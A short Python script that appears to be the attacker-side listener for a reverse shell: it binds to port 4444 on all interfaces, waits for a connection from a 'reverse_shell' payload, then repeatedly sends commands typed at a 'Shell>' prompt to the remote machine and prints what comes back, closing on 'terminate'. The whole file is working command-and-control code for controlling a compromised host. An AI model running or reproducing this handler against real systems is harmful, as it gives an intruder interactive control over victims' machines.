import socket

def receive_connection():
    #this function receives the payload from the reverse_shell function and accepts the connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 4444))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] We got a connection from: %s" % str(addr))
    while True:
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send(command.encode())
            conn.close()
            s.close()
            break
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())

receive_connection()